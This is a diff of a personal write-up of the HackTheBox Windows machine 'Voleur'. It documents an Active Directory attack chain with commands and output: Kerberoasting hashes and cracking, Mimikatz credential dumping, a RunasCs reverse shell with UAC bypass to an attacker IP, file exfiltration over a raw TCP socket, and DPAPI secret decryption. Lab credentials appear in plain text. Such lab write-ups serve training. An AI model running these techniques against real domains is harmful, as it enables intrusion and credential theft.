@@ -9,7 +9,25 @@ tags:
   - HTB
   - windows
   - medium
-lastmod: 2026-06-11T05:01:15.641Z
+  - Nmap-ad
+  - Port139-135-SMB-NTLM-False
+  - Port88-LDAP-getST
+  - Bloodhound-Collect-Nxc-failed
+  - Bloodhound-Collect-rusthound
+  - Bloodhound-Vectory-Where-Outbound
+  - Port369-LDAP-ldapsearch-failed
+  - Bloodhound-Vectory-WriteSPN
+  - Bloodhound-Remote-Management
+  - Lateral-Movement-Mimikatz
+  - Windows-Privilege-winpeas
+  - Port369-LDAP-deleted-account-windows
+  - Windows-Privilege-Escalation-DPAPI
+  - port139-135-smb-smbclient-py
+  - Lateral-Movement-RunasCs
+  - Windows-Privilege-Escalation-Dataleak-Lazagne
+  - Lateral-Movement-RunasCs-1
+  - ssh-idrsa-decode
+lastmod: 2026-06-12T06:33:26.283Z
 ---
 # Box Info
 
@@ -21,7 +39,11 @@ lastmod: 2026-06-11T05:01:15.641Z
 
 ### PORT & IP SCAN
 
-summary the openport only with One-Paragraph -- AI
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Nmap-ad" >}} That is the Active Directory AD ad look like
+
+{{< /toggle >}}
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -103,22 +125,13 @@ ff02::2    ip6-allrouters
 
 ### SMB
 
-```
-┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
-└──╼ $ netexec smb DC.voleur.htb  -u 'guest' -p '' --shares                                                                                                                                                 
-SMB         10.129.8.21     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
-SMB         10.129.8.21     445    DC               [-] voleur.htb\guest: STATUS_NOT_SUPPORTED 
-
-┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
-└──╼ $netexec smb DC.voleur.htb  -u 'gue' -p '' --shares                                                                                                                                                   
-SMB         10.129.8.21     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
-^[[B^[[BSMB         10.129.8.21     445    DC               [-] voleur.htb\gue: STATUS_NOT_SUPPORTED 
-
-```
-
 As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt
 
-`STATUS_NOT_SUPPORTED` means that NTLM auth is disabled. `netexec` also shows this as “NTLM:False”. With Kerberos (after making sure my clock is aligned with `sudo ntpdate voleur.htb`), it works:
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-NTLM-False" >}} STATUS\_NOT\_SUPPORTED means that NTLM auth is disabled. netexec also shows this as “NTLM:False”. With Kerberos (after making sure my clock is aligned with sudo ntpdate voleur.htb), it works to fix the KRB5KRB-AP-ERR-SKEW  error
+
+{{< /toggle >}}
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -131,6 +144,12 @@ As is common in real life Windows pentests, you will start the Voleur box with c
 SMB         10.129.8.21     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
 SMB         10.129.8.21     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port88-LDAP-getST" >}} In the Active Directory , using the getTGT.py  to impersonate users so that dont need to username and password to have ccache  .
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~]
@@ -145,6 +164,12 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in ryan.naylor.ccache
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "port139-135-smb-smbclient-py" >}} with the ccache to use the smbclient.py to do the interactive with SMB
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~]
@@ -166,7 +191,13 @@ Type help for list of commands
 
 ```
 
-https://neoisbackagain.github.io/cyber-blog/posts/cyberlab/oscp/vulnlab/medium/vulncicada/#smbclientpy
+Or I can use `smbclient` (with the `krb5.conf` in place):
+
+```
+oxdf@hacky$ smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
+Try "help" to get a list of possible commands.
+smb: \> 
+```
 
 the finance and HR should not be here, but both i cant get in
 
@@ -347,6 +378,12 @@ MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=
 MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Collect-Nxc-failed" >}} Due to error of S-1-5-21-3927696377-1337352550-2781715495-512 , so failed to collect the data to blood
+
+{{< /toggle >}}
+
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
 └─$ netexec ldap DC.voleur.htb   -u ryan.naylor -p HollowOct31Nyt -k  --bloodhound -c All --dns-server 10.129.8.132
@@ -371,11 +408,23 @@ During handling of the above exception, another exception occurred:
 
 ```
 
-Finally the rust can do with that after in the carge
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Collect-rusthound" >}} Collect the Data from rusthound-ce
+
+{{< /toggle >}}
+
+```autohotkey
+https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.7/rusthound-ce-Linux-gnu-x86_64.tar.gz
+```
+
+```autohotkey
+tar  -xzvf rusthound-ce-Linux-gnu-x86_64.tar.gz
+```
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/voleur/RustHound-CE]
-└─$ /home/parallels/.cargo/bin/rusthound-ce --domain voleur.htb  -u ryan.naylor  -p 'HollowOct31Nyt' --zip
+└─$ ./rusthound-ce --domain voleur.htb  -u ryan.naylor  -p 'HollowOct31Nyt' --zip
 
 ---------------------------------------------------
 Initializing RustHound-CE at 23:05:49 on 06/06/26
@@ -447,6 +496,14 @@ My owned user dont have any outhound
 
 After having all user , just need to know who can outhound
 
+### Outbound
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Vectory-Where-Outbound" >}} Checking who has the outbound can clearly help you decide your attack direction , If you dont have that account owned direction , back to enumerate to find you need user -k --kerberoasting to have the hashes
+
+{{< /toggle >}}
+
 ```
 MATCH (u:User)-[r]->(target)
 WHERE u.domain = "VOLEUR.HTB"
@@ -457,29 +514,15 @@ RETURN u, r, target
 
 The Guest and Administrator can be igorned, so we just force on SVC\_LDAP
 
+### WriteSPN
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Vectory-WriteSPN" >}} The user has the WriteSPN to another user and using the bloodyAD to abuse ,and using the netexec 's --kerberoasting to have the hashes   ,also can try with targetedKerberoast.py to do it .
+
+{{< /toggle >}}
+
 ![Pasted image 20260606232947.png](/ob/Pasted%20image%2020260606232947.png)
-
-![Pasted image 20260606233104.png](/ob/Pasted%20image%2020260606233104.png)
-
-Seem like i can Restoring a deleted Active Directory (AD) , i did it in the CPTS
-
-```
-ldapsearch -H ldap://10.129.8.132 -D "CN=ryan.naylor@DC.voleur.htb"  -w "HollowOct31Nyt"  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
-```
-
-```
-┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
-└─$ ldapsearch -H ldap://10.129.8.132 -D "CN=svc_ldap@DC.voleur.htb"  -w "M1XyC9pW7qT5Vn"  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
-ldap_bind: Invalid credentials (49)
-        additional info: 80090308: LdapErr: DSID-0C09059D, comment: AcceptSecurityContext error, data 52e, v4f7c
-
-```
-
-svc\_ldap M1XyC9pW7qT5Vn
-
-targetedKerberoast.py -v -d 'voleur.htb' -u 'svc\_ldap' -p 'M1XyC9pW7qT5Vn'
-
-OMG need to use the -k to avoild the error, so annoying
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
@@ -530,7 +573,9 @@ LDAP        DC.voleur.htb   389    DC               [*] sAMAccountName: svc_winr
 LDAP        DC.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$9d49b855eaf3a4adeee3a09f00f8ddee$35b1f8acce8f249087211c115d8802d338492158456f9ba17e6448d3070e2e71770bae37dbaffab589b39eb545b7a0f813277e3ef06b00e52cb3edc45357bf511d0f72669d719e9537c51990aaef45ae74e4f1ecb588225100b9d8acd03b9d74793fa440422b7cab983fa05e3a97e1430be3d4ad5b0a10d9fc38238484f9c0c2a083d9801dccb92883a7673f5c6c9515cbc2279b4c3de39b2cd20a6a1da98b0fb2dfb3b24fd149be97eeaf19665ddab2efca361b3efa52c7829486a7f47ff4995b27a287e0d434c0ee41d056f47252c2b5ce938af3d32dffc52f4f6f256f2040303452f43bb4efabc28fddf8984c23248e09e5fb03f6a3006a21058ef4db7261dfd4eba5b8d428d6c4a9f7f54f11567e36ca16674d3d076bc83520e147b7e74cd6420d913d51edcdbccc040143bbc16c22a26063deed91206203278dc73604747157b0411985ca6b72b9ef4b54cf4a81b810fff0880df398df66beeab56f953deb34779a4da9cadd78b5832491a6b28bbb128608b1532e22294df8c7164e5356c418be4bd55c5039bf320cd9a6d2ef0749f6ffb66967f5be8a131a457e76141c83e905e191456ead80cc3b42280d6e3ae30c2836751976177bc456d89cd4717b8157d6d6399df2c991d5eeda2df8887ecd14616fdb30739cc442b6093616264f62eff74f5fb399901937f73b8b9c67da3162305d041f97d116b74c9090eaf52c1210701cd90b322df52e370127d005f9d2c8d4de1b9c0b33119fbcd744e94583750bd6b68832fe4c27caddc82bd73abbb9b7171a845c5867baaa05877619e48bff319309cba9c6664c2f9e65ec6784ec4dc9b6edcd5129d5f610abb50d3c58b3224a5f19c2db25a4e796f4b2103b8f293042813cd33c2ce77fe5af899d3943747900989a6e8673e0c71d75eb9ec55226a459d7ac8dd8e58f0b2a58469f9eab525978fb353d26c0c17e744f37a42f3f135f00d26aa99d7e81bf89dfa26191424e4e377b66951f8055725a07eabcb6321f2ccada7df39819b9aa6dc719b11eff89ac4d163c1cc8f1425a80a0e47e72f73a7c0e7e36d463fb8d7c8e27a5597df6dc5821d114a3440f085c4c6c2c1b2a24c6c45d3e1b90db7c2b5d2b972eea51f44c83c65fa261cca894c846820aee2a54448ce5a6cc88ec2ccb1c20b75cd7d848c186da3c3e741e69f58e349772ad486ca7346fbad7fba7e08a94e9c1e356b24f8fb838e62ccf9f72df04c8f6ce60acd31582a6831638f454ed346a4501200de1f9e5396e5d6b89d926510a8b3f848954dc492e8c258e7130ed5d3f3ba373f938abaf4758079ee6fc2f4ea938f481c5e38952b7427ffbabec3a7121d39c9a493a3c072a6d07a481d4960b2a7e10cf1a2ea2f9ef1075a78ef50a66660596cb1a1a51e0b7ac43b3ab705009d0a94f0e8300122285a3bee0db42608219c6367e2e90d1d1b5d89cd224134df8f001da3e4f19b45873e3      
 ```
 
-No work
+### targetedKerberoast
+
+also can try with targetedKerberoast.py to do it
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
@@ -546,7 +591,7 @@ CLOCK: time stepped by 28794.411846
 
 ```
 
-Cant with macbook!
+### Hashcat
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
@@ -607,71 +652,17 @@ $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$b2054c9d13850ff6ed45fdbe
 ...[snip]...
 ```
 
-the rdp should work
+***
 
-```
-┌──(parallels㉿kali-linux-2025-2)-[~]
-└─$ su root         
-Password: 
+{{< toggle "Tag 🏷️" >}}
 
-```
+{{< tag "Bloodhound-Remote-Management" >}} Remote-Management is the Port 5985 , although the nxc is failed , but it really exists, So using the getST.py to make the evil-winrm / evil-winrm-py success , krb5-user
 
-```
-for proto in smb smb winrm wmi rdp ssh ldap mssql ftp; do 
-  echo -e "\n[*] Testing $proto..."
-	ntpdate voleur.htb && sleep 1 &&
-  netexec $proto dc.voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -k
-done
-```
+{{< /toggle >}}
 
-```
-┌──(root㉿kali-linux-2025-2)-[/home/parallels]
-└─# for proto in smb smb winrm wmi rdp ssh ldap mssql ftp; do 
-  echo -e "\n[*] Testing $proto..."
-        ntpdate voleur.htb && sleep 1 &&
-  netexec $proto dc.voleur.htb -u 'svc_winrm'  -k --use-kcache
-done
+Remote-Management is the Port 5985 , although the nxc is failed , but it really exists
 
-[*] Testing smb...
-2026-06-07 08:29:51.502454 (+0800) -0.038118 +/- 0.166718 voleur.htb 10.129.8.132 s1 no-leap
-SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
-SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 
-
-[*] Testing smb...
-2026-06-07 08:30:02.744737 (+0800) +0.015208 +/- 0.110495 voleur.htb 10.129.8.132 s1 no-leap
-SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
-SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 
-
-[*] Testing winrm...
-2026-06-07 08:30:14.121659 (+0800) +0.010239 +/- 0.110659 voleur.htb 10.129.8.132 s1 no-leap
-[08:30:16] ERROR    Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently                   winrm.py:66
-WINRM       dc.voleur.htb   5985   dc.voleur.htb    [*] None (name:dc.voleur.htb) (domain:None) (NTLM:False)
-
-[*] Testing wmi...
-2026-06-07 08:30:16.683063 (+0800) +0.008596 +/- 0.112363 voleur.htb 10.129.8.132 s1 no-leap
-[08:30:19] ERROR    Exception while calling proto_flow() on target dc.voleur.htb: ('unpack requires a buffer of 2 bytes', "When unpacking field                connection.py:187
-                    'SecondaryAddrLen | <H&SecondaryAddr | b''[:2]'")                                                                                                           
-                    error: ('unpack requires a buffer of 2 bytes', "When unpacking field 'SecondaryAddrLen | <H&SecondaryAddr | b''[:2]'")                                      
-
-[*] Testing rdp...
-2026-06-07 08:30:19.613032 (+0800) +0.007568 +/- 0.111161 voleur.htb 10.129.8.132 s1 no-leap
-
-[*] Testing ssh...
-2026-06-07 08:30:31.476034 (+0800) +28794.552104 +/- 0.148177 voleur.htb 10.129.8.132 s1 no-leap
-CLOCK: time stepped by 28794.552104
-
-[*] Testing ldap...
-2026-06-07 08:30:48.362560 (+0800) -0.004302 +/- 0.153765 voleur.htb 10.129.8.132 s1 no-leap
-LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
-LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 
-
-[*] Testing mssql...
-2026-06-07 08:30:55.465415 (+0800) +0.033847 +/- 0.110356 voleur.htb 10.129.8.132 s1 no-leap
-
-[*] Testing ftp...
-2026-06-07 08:31:02.240955 (+0800) +0.023420 +/- 0.126675 voleur.htb 10.129.8.132 s1 no-leap
-
-```
+![Pasted image 20260612120018.png](/ob/Pasted%20image%2020260612120018.png)
 
 ```
 ┌──(root㉿kali-linux-2025-2)-[/home/parallels]
@@ -735,21 +726,48 @@ voleur\svc_winrm
 
 ```
 
+```
+┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
+└──╼ $evil-winrm-py -i dc.voleur.htb -k --no-pass --spn-hostname dc.voleur.htb
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.5.0
+
+[*] Connecting to 'dc.voleur.htb:5985' as 'svc_winrm@VOLEUR.HTB'
+evil-winrm-py PS C:\Users\svc_winrm\Documents>
+```
+
 ***
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port369-LDAP-ldapsearch-failed" >}} With the owned account to do the LDAP inquiry for finding the deleted users information in Active Directory (AD)  ,but failed.
+
+{{< /toggle >}}
+
+![Pasted image 20260606233104.png](/ob/Pasted%20image%2020260606233104.png)
+
+```
+ldapsearch -H ldap://10.129.8.132 -D "CN=ryan.naylor@DC.voleur.htb"  -w "HollowOct31Nyt"  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
+```
+
+```
+┌──(parallels㉿kali-linux-2025-2)-[~/voleur]
+└─$ ldapsearch -H ldap://10.129.8.132 -D "CN=svc_ldap@DC.voleur.htb"  -w "M1XyC9pW7qT5Vn"  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
+ldap_bind: Invalid credentials (49)
+        additional info: 80090308: LdapErr: DSID-0C09059D, comment: AcceptSecurityContext error, data 52e, v4f7c
+
+```
 
 # Failed
 
-**Administrative/SYSTEM Privileges:** Mimikatz must be run as a local administrator or SYSTEM and requires debugging rights to interact with the protected LSASS (Local Security Authority Subsystem Service) memory process.
+{{< toggle "Tag 🏷️" >}}
 
-The next is the local windows sentensive data , or others
+{{< tag "Lateral-Movement-Mimikatz" >}} Failed !!!! Mimikatz must be run as a local administrator or SYSTEM and requires debugging rights to interact with the protected LSASS (Local Security Authority Subsystem Service) memory process.
 
-```
-echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
-```
-
-```
-echo "nameserver 10.129.10.35" | sudo tee /etc/resolv.conf
-```
+{{< /toggle >}}
 
 ```
 ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -781,7 +799,7 @@ Archive:  mimikatz_trunk.zip
   inflating: x64/mimispool.dll  
 ```
 
-cd x64
+Upload by *Evil-WinRM*
 
 ```
 *Evil-WinRM* PS C:\> cd C:\ProgramData
@@ -809,7 +827,7 @@ mimikatz #
 
 ```
 
-So use the 命令**脚本式执行**
+Run it by
 
 ```
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > pssword.txt
@@ -837,6 +855,12 @@ Bye!
 
 ### Winpeas
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-winpeas" >}} Setting up the winpeas and analyze ,redirect the output to a netcat listener so you get a local copy on your Kali host. Then you can run bat winpeas.txt to slowly scroll through the results in color.
+
+{{< /toggle >}}
+
 ```
 echo "nameserver 10.129.10.35" | sudo tee /etc/resolv.conf
 ```
@@ -857,10 +881,13 @@ HTTP request sent, awaiting response... 302 Found
 
 ```
 
-```
-*Evil-WinRM* PS C:\Users\svc_winrm\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.16.128/winPEASx64.exe','C:\ProgramData\winPEASx64.exe')
+From windows to download the winPEASx64
 
 ```
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.16.128/winPEASx64.exe','C:\ProgramData\winPEASx64.exe')
+```
+
+open the server
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -892,6 +919,8 @@ evil-winrm-py PS C:\Users\svc_winrm\Documents>
 
 ```
 
+on Linux
+
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
 └──╼ $nc -lvnp 4444 > output.txt
@@ -899,6 +928,8 @@ Listening on 0.0.0.0 4444
 
 
 ```
+
+on windows
 
 ```
 evil-winrm-py PS C:\ProgramData> $client = New-Object Net.Sockets.TcpClient('10.10.16.128', 4444)
@@ -908,6 +939,10 @@ $stream.Write($bytes, 0, $bytes.Length)
 $client.Close()
 
 ```
+
+### Bat
+
+Using the bat to check
 
 ```
 ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -929,6 +964,8 @@ Summary:
 
 ```
 
+### windpeas checklist
+
 And then go around , to check by tree /f
 
 * / credentials
@@ -936,6 +973,10 @@ And then go around , to check by tree /f
 * / System
 * / Interesting
 * / Program Files
+
+***
+
+### Active directory Enum
 
 ```
 evil-winrm-py PS C:\IT> tree /f .
@@ -948,33 +989,13 @@ C:\IT
 
 ```
 
-```
-evil-winrm-py PS C:\IT> Get-ADOptionalFeature 'Recycle Bin Feature'
-
-
-DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows 
-                     NT,CN=Services,CN=Configuration,DC=voleur,DC=htb
-EnabledScopes      : {CN=Partitions,CN=Configuration,DC=voleur,DC=htb, CN=NTDS 
-                     Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=voleur,DC=htb}
-FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
-FeatureScope       : {ForestOrConfigurationSet}
-IsDisableable      : False
-Name               : Recycle Bin Feature
-ObjectClass        : msDS-OptionalFeature
-ObjectGUID         : ba06e572-1681-46f7-84d2-e08b001f5c51
-RequiredDomainMode : 
-RequiredForestMode : Windows2008R2Forest
-```
-
-```
-┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Voleur]
-└──╼ $ldapsearch -H ldap://10.129.10.35 -D "CN=svc_winrm@DC.voleur.htb"  -w AFireInsidedeOzarctica980219afi  -b "CN=Deleted Objects,DC=DC,DC=voleur,DC=htb" -s sub -E 1.2.840.113556.1.4.417  "(isDeleted=TRUE)" "*"
-ldap_bind: Invalid credentials (49)
-	additional info: 80090308: LdapErr: DSID-0C09059D, comment: AcceptSecurityContext error, data 52e, v4f7c
-
-```
-
 ### RunasCs.exe
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-RunasCs-1" >}} If you have the account , but the account dont have the rdp , winrm etc 's movement , the RunasCs can help you to switch account on the same machine in the domain by revshell .
+
+{{< /toggle >}}
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -1010,6 +1031,12 @@ PS C:\Windows\system32>
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port369-LDAP-deleted-account-windows" >}} Using the windows 's  AD module 's  Get-ADOptionalFeature found the deleted account in Recycle Bin Feature and recover it .
+
+{{< /toggle >}}
+
 ```
 PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
@@ -1032,8 +1059,6 @@ PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031
 Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 
 ```
-
-\== AD dont need to winpeas , need the runasCS.exe , mimikatz Window Credentials Leak 憑證洩漏
 
 Use the RunasCs.exe to switch the account
 
@@ -1068,6 +1093,12 @@ Use the RunasCs.exe to switch the account
 ```
 
 ![Pasted image 20260610133043.png](/ob/Pasted%20image%2020260610133043.png)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-RunasCs" >}} If you have the account , but the account dont have the rdp , winrm etc 's movement , the RunasCs can help you to switch account on the same machine in the domain by revshell with  --bypass-uac sometime will success
+
+{{< /toggle >}}
 
 ```
 evil-winrm-py PS C:\Users\svc_winrm\Documents> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.16.128:443 --bypass-uac
@@ -1126,6 +1157,12 @@ C:\USERS\TODD.WOLFE
 +---Videos
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-Dataleak-Lazagne" >}} LaZagne.exe is a tool can automatcially find the sentive data , but if the data is in the innormal place , it would not check
+
+{{< /toggle >}}
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Voleur]
@@ -1208,6 +1245,16 @@ C:\IT
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-DPAPI" >}} Found the credential in AppData\Roaming\Microsoft\Credentials ,  and using the dpapi.py to decode the password
+
+{{< /toggle >}}
+
+ref : https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
+
+The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
+
 ```
 PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls AppData\Roaming\Microsoft\Credentials
 ls AppData\Roaming\Microsoft\Credentials
@@ -1276,6 +1323,8 @@ f�Q�*	�`��&=���M��C� �6d�j0��Tk�
                                                            
 ```
 
+### SID
+
 Credential Manager was introduced with Windows 7. It is like a digital vault to keep all of your credentials safe. All of the credentials are stored in a credentials folder which you will find at this location – **%Systemdrive%\Users\<Username>\AppData\Local\Microsoft\Credentials** and it is this folder that credential manager accesses. it also allows you to add, edit, delete, backup and even restore the passwords.
 
 ```
@@ -1293,6 +1342,8 @@ d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550
 
 ```
 
+### Guid
+
 ```
 PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> dir
 dir
@@ -1309,7 +1360,9 @@ Mode                 LastWriteTime         Length Name
 
 ```
 
-I’ll use `dpapi.py` to decrypt the master key:
+### dpapi.py
+
+I’ll use `dpapi.py` to decrypt the master key:  with Guid and sid
 
 ```
 └──╼ $/usr/share/doc/python3-impacket/examples/dpapi.py  masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
@@ -1518,6 +1571,12 @@ $stream.Write($bytes, 0, $bytes.Length)
 $stream.Close()
 $client.Close()
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "ssh-idrsa-decode" >}} having the id\_rsa only, but i dont know the username , so I can use the  ssh-keygen and strings to find back the username
+
+{{< /toggle >}}
 
 The user that created the key is stored in the encoded data of the key as the comment. I’ll base64 decode the key and run `strings`, and the last one is “svc\_backup@DC”:
 
